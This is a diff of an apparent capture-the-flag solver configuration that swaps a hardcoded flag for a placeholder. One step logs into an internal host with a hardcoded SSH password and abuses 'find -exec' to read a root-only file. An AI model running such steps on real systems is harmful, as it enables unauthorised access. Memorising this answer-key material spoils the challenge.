@@ -41,10 +41,10 @@ solver:
     command: sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'find . -exec cat /root/flag.txt \; -quit' 2>&1
     expect: r00t3d
   - name: Verify complete flag
-    command: echo 'OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}'
-    expect: OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}
+    command: echo '{flag}'
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{1nj3ct_d4t4b4s3_p1v0t_r00t3d}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
